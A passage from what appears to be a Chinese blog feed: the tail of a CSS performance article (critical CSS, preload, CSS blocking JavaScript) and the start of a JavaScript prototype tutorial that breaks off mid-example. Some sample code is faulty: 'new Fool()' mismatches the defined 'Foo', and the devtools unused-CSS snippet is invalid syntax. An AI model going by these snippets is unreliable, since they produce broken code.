CSS提取策略？</strong></p><p>工具链：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用Penthouse提取关键CSS</span><br>npm install penthouse -g<br>penthouse http://example.com critical.css<br></code></pre></td></tr></table></figure><p>实施步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 内联关键CSS --&gt;<br>&lt;style&gt;<br>  .header, .hero &#123; /* 首屏可见区域样式 */ &#125;<br>&lt;/style&gt;<br><br>&lt;!-- 异步加载剩余CSS --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;full.css&quot; as=&quot;style&quot; onload=&quot;this.rel=&#x27;stylesheet&#x27;&quot;&gt;<br>&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;full.css&quot;&gt;&lt;/noscript&gt;<br></code></pre></td></tr></table></figure><h3 id="CSS与JavaScript"><a href="#CSS与JavaScript" class="headerlink" title="CSS与JavaScript"></a>CSS与JavaScript</h3><p><strong>Q：为什么说”CSS会阻塞JavaScript执行”？</strong></p><ul><li>默认行为：<ul><li>浏览器遇到<code>&lt;script&gt;</code>时会暂停 DOM 构建</li><li>如果存在未完成的 CSSOM 构建，JavaScript执行将被阻塞</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;link rel=&quot;stylesheet&quot; href=&quot;slow.css&quot;&gt;<br>&lt;script&gt;<br>  // 此脚本必须等待slow.css下载并解析完成<br>  console.log(&#x27;After CSSOM&#x27;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>Q：优化方案？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 方案1：添加defer --&gt;<br>&lt;script defer src=&quot;app.js&quot;&gt;&lt;/script&gt;<br><br>&lt;!-- 方案2：动态注入CSS --&gt;<br>&lt;script&gt;<br>  const link = document.createElement(&#x27;link&#x27;);<br>  link.rel = &#x27;stylesheet&#x27;;<br>  link.href = &#x27;non-critical.css&#x27;;<br>  document.head.appendChild(link);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="如何设计CSS性能监控埋点系统"><a href="#如何设计CSS性能监控埋点系统" class="headerlink" title="如何设计CSS性能监控埋点系统"></a>如何设计CSS性能监控埋点系统</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 监控CSS加载时间</span><br><span class="hljs-keyword">const</span> cssResource = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">&#x27;resource&#x27;</span>)<br>  .<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">&#x27;css&#x27;</span>);<br>  <br><span class="hljs-comment">// 2. 检测未使用CSS</span><br><span class="hljs-keyword">const</span> &#123; unusedRules &#125; = <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">devtools</span>.<span class="hljs-property">inspectedWindow</span>.<span class="hljs-built_in">eval</span>(<br>  <span class="hljs-string">`(<span class="hljs-subst">$&#123;() =&gt; &#123;</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-keyword">const</span> used = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>();</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(<span class="hljs-variable language_">document</span>.querySelectorAll(<span class="hljs-string">&#x27;*&#x27;</span>))</span></span><br><span class="hljs-subst"><span class="hljs-string">      .forEach(el =&gt; used.add(el.className));</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-keyword">return</span> unusedRules: <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(<span class="hljs-variable language_">document</span>.styleSheets)</span></span><br><span class="hljs-subst"><span class="hljs-string">      .flatMap(sheet =&gt; <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(sheet.cssRules)</span></span><br><span class="hljs-subst"><span class="hljs-string">      .filter(rule =&gt; !used.has(rule.selectorText))</span></span><br><span class="hljs-subst"><span class="hljs-string">  &#125;&#125;</span>)()`</span><br>);<br></code></pre></td></tr></table></figure><h1 id="第七章：实战与前沿技术"><a href="#第七章：实战与前沿技术" class="headerlink" title="第七章：实战与前沿技术"></a>第七章：实战与前沿技术</h1><h2 id="7-1-CSS-绘制复杂图形（clip-path、SVG-CSS）"><a href="#7-1-CSS-绘制复杂图形（clip-path、SVG-CSS）" class="headerlink" title="7.1 CSS 绘制复杂图形（clip-path、SVG + CSS）"></a>7.1 CSS 绘制复杂图形（clip-path、SVG + CSS）</h2><h2 id="7-2-暗黑模式实现（prefers-color-scheme）"><a href="#7-2-暗黑模式实现（prefers-color-scheme）" class="headerlink" title="7.2 暗黑模式实现（prefers-color-scheme）"></a>7.2 暗黑模式实现（prefers-color-scheme）</h2><h2 id="7-3-视差滚动（background-attachment）"><a href="#7-3-视差滚动（background-attachment）" class="headerlink" title="7.3 视差滚动（background-attachment）"></a>7.3 视差滚动（background-attachment）</h2><h2 id="7-4-CSS-Houdini（自定义属性、Paint-API）"><a href="#7-4-CSS-Houdini（自定义属性、Paint-API）" class="headerlink" title="7.4 CSS Houdini（自定义属性、Paint API）"></a>7.4 CSS Houdini（自定义属性、Paint API）</h2><h2 id="7-5-未来-CSS-趋势（-container、subgrid、-has-）"><a href="#7-5-未来-CSS-趋势（-container、subgrid、-has-）" class="headerlink" title="7.5 未来 CSS 趋势（@container、subgrid、:has()）"></a>7.5 未来 CSS 趋势（@container、subgrid、:has()）</h2>]]></content>
    
    
    <categories>
      
      <category>CSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript 原型/原型链专题知识学习</title>
    <link href="/2025/06/21/JavaScript%20Prototype/"/>
    <url>/2025/06/21/JavaScript%20Prototype/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：JavaScript-对象基础"><a href="#第一章：JavaScript-对象基础" class="headerlink" title="第一章：JavaScript 对象基础"></a>第一章：JavaScript 对象基础</h1><h2 id="1-1-对象的概念与创建方式"><a href="#1-1-对象的概念与创建方式" class="headerlink" title="1.1 对象的概念与创建方式"></a>1.1 对象的概念与创建方式</h2><p><strong>基本概念</strong></p><p>JavaScript 对象是键值对的集合，是 JavaScript 的核心数据类型。对象可以看作是无序的属性集合，每个属性都有一个名称（键）和一个值。</p><p>对象的特点有以下几点：</p><ul><li>动态性：随时可添加&#x2F;删除属性</li><li>引用类型：对象是通过引用访问的复合值</li><li>原型继承：每个对象都有原型链</li><li>属性特性：对象的属性可以拥有可读、可写、可枚举、可配置等特性</li></ul><span id="more"></span><p><strong>创建方式</strong></p><p>（1）对象字面量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;张三&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>  <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我是<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）new Object()构造函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> car = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>car.<span class="hljs-property">brand</span> = <span class="hljs-string">&#x27;Toyota&#x27;</span>;<br>car.<span class="hljs-property">model</span> = <span class="hljs-string">&#x27;Camry&#x27;</span>;<br></code></pre></td></tr></table></figure><p>（3）构造函数方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;李四&#x27;</span>, <span class="hljs-number">25</span>);<br></code></pre></td></tr></table></figure><p>（4）Object.create()方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> prototypeObj = &#123;<br>  <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> myObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(prototypeObj);<br>myObj.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;王五&#x27;</span>;<br></code></pre></td></tr></table></figure><p>（5）ES6 class 语法糖</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>  <br>  <span class="hljs-title function_">speak</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span> makes a noise.`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">&#x27;Dog&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="1-2-属性的访问与操作"><a href="#1-2-属性的访问与操作" class="headerlink" title="1.2 属性的访问与操作"></a>1.2 属性的访问与操作</h2><p><strong>访问属性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 点表示法</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);<br><br><span class="hljs-comment">// 方括号表示法</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[<span class="hljs-string">&#x27;age&#x27;</span>]);<br></code></pre></td></tr></table></figure><p><strong>属性操作</strong></p><p>（1）添加&#x2F;删除属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">person.<span class="hljs-property">job</span> = <span class="hljs-string">&#x27;Developer&#x27;</span>;<br>person[<span class="hljs-string">&#x27;hobby&#x27;</span>] = <span class="hljs-string">&#x27;Reading&#x27;</span>;<br></code></pre></td></tr></table></figure><p>（2）删除属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">delete</span> person.<span class="hljs-property">age</span>;<br></code></pre></td></tr></table></figure><p>（3）检查属性是否存在</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> person); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="1-3-对象与原始类型的区别"><a href="#1-3-对象与原始类型的区别" class="headerlink" title="1.3 对象与原始类型的区别"></a>1.3 对象与原始类型的区别</h2><ul><li>存储与访问机制：原始类型存储在栈内存中，对象类型存储在堆内存中，变量保存其引用地址</li><li>可变性差异：原始类型不可变，对象类型可变</li><li>比较行为：原始类型对比值，对象类型对比引用</li><li>方法与属性：原始类型不能添加属性和方法，对象类型可以自由添加&#x2F;修改</li></ul><h1 id="第二章：初识原型（Prototype）"><a href="#第二章：初识原型（Prototype）" class="headerlink" title="第二章：初识原型（Prototype）"></a>第二章：初识原型（Prototype）</h1><h2 id="2-1-什么是原型？"><a href="#2-1-什么是原型？" class="headerlink" title="2.1 什么是原型？"></a>2.1 什么是原型？</h2><p>原型（Prototype）是 JavaScript 实现继承的核心机制。每个 JavaScript 对象都有一个内置的 [[Prototype]] 属性（可通过 <code>__proto__</code> 访问），指向它的原型对象</p><h2 id="2-2-prototype-属性的作用"><a href="#2-2-prototype-属性的作用" class="headerlink" title="2.2 prototype 属性的作用"></a>2.2 <code>prototype</code> 属性的作用</h2><p>prototype 是 JavaScript 中函数对象特有的属性，它的核心作用是为基于该构造函数创建的实例提供共享的属性和方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-comment">// 添加到prototype的方法会被所有实例共享</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br>p1.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// Hi, I&#x27;m Alice</span><br></code></pre></td></tr></table></figure><h2 id="2-3-默认原型：Object-prototype"><a href="#2-3-默认原型：Object-prototype" class="headerlink" title="2.3 默认原型：Object.prototype"></a>2.3 默认原型：<code>Object.prototype</code></h2><p>Object.prototype 是 JavaScript 中所有对象的终极原型，是原型链的顶端（终点是 null）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>); <span class="hljs-comment">// null</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Fool</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(f.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) <span class="hljs-comment">// undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(f.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>它包含所有对象继承的基本方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 常见方法</span><br>.<span class="hljs-title function_">toString</span>()<br>.<span class="hljs-title function_">valueOf</span>()<br>.<span class="hljs-title function_">hasOwnProperty</span>()<br>.<span class="hljs-title function_">isPrototypeOf</span>()<br></code></pre></td></tr></table></figure><p>默认继承关系如下：</p><pre class="mermaid">graph LR    A[你的对象] --> B[Object.prototype]    C[数组] --> D[Array.prototype] --> B    E[函数] --> F[Function.prototype] --> B    B --> G[null]</pre><h2 id="2-4-通过原型共享属性和方法"><a href="#2-4-通过原型共享属性和方法" class="headerlink" title="2.4 通过原型共享属性和方法"></a>2.4 通过原型共享属性和方法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// 实例属性（不共享）</span><br>&#125;<br><br><span class="hljs-comment">// 添加到prototype的方法会被所有实例共享</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-keyword">const</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>);<br><br>p1.<span class="hljs-property">sayHello</span> === p2.<span class="hljs-property">sayHello</span> <span class="hljs-comment">// true（共享同一方法）</span><br></code></pre></td></tr></table></figure><h1 id="第三章：构造函数与实例"><a href="#第三章：构造函数与实例" class="headerlink" title="第三章：构造函数与实例"></a>第三章：构造函数与实例</h1><h2 id="3-1-构造函数的作用与定义"><a href="#3-1-构造函数的作用与定义" class="headerlink" title="3.1 构造函数的作用与定义"></a>3.1 构造函数的作用与定义</h2><p><strong>作用</strong></p><ol><li>创建对象模版：定义一类对象的共同属性和方法</li><li>初始化对象状态：为新对象设置初始属性值</li><li>实现原型继承：通过 prototype 共享属性和方法</li><li>类型标识：通过 instanceof 识别对象类型</li></ol><p><strong>定义方式</strong></p><p>（1）传统定义方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-comment">// 实例属性</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  <br>  <span class="hljs-comment">// 不推荐：每个实例都会创建新函数</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 推荐：共享方法</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">introduce</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.age&#125;</span> years old`</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）class 语法糖</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  &#125;<br>  <br>  <span class="hljs-comment">// 自动添加到prototype</span><br>  <span class="hljs-title function_">introduce</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.age&#125;</span> years old`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造函数具有以下特征：</p><ol><li>命名约定：首字母大写（如 Person）</li><li>必须以 <code>new</code> 调用：否则 <code>this</code> 指向全局对象（严格模式下会报错）</li><li>隐式返回：自动返回新对象（除非手动返回非原始值）</li></ol><h2 id="3-2-new-操作符的执行过程"><a href="#3-2-new-操作符的执行过程" class="headerlink" title="3.2 new 操作符的执行过程"></a>3.2 <code>new</code> 操作符的执行过程</h2><p>当使用 new 调用构造函数时，JavaScript 引擎会完成以下操作：</p><ol><li>隐式创建新对象：创建一个新的空对象</li><li>设置原型链接：将该对象的 <code>[[Prototype]]</code> 属性（即 <code>__proto__</code>）链接到构造函数的 prototype 属性</li><li>绑定 this：将新对象绑定到构造函数内部的 this 上下文</li><li>自动返回：<ul><li>如果构造函数没有显式 return 语句，自动返回新创建的对象</li><li>如果 return 非对象类型，仍返回新对象（忽略 return）</li><li>如果 return 对象类型，则返回该对象（覆盖默认行为）</li></ul></li></ol><p><strong>代码示例</strong></p><p>（1）无 return 语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-comment">// 无 return 语句</span><br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p); <span class="hljs-comment">// Person &#123; name: &quot;Alice&quot; &#125;（返回新对象）</span><br></code></pre></td></tr></table></figure><p>（2）return 非对象（原始值）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">model</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">model</span> = model;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">123</span>; <span class="hljs-comment">// 原始值被忽略</span><br>&#125;<br><br><span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&#x27;Tesla&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c); <span class="hljs-comment">// Car &#123; model: &quot;Tesla&quot; &#125;（仍返回新对象）</span><br></code></pre></td></tr></table></figure><p>（3）return 对象类型（覆盖默认行为）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Default&quot;</span>;<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Override&quot;</span> &#125;; <span class="hljs-comment">// 返回这个对象</span><br>&#125;<br><br><span class="hljs-keyword">const</span> d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d); <span class="hljs-comment">// &#123; name: &quot;Override&quot; &#125;（不是 Dog 实例）</span><br></code></pre></td></tr></table></figure><p><strong>关键注意事项</strong></p><p>（1）忘记 new 的后果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>); <span 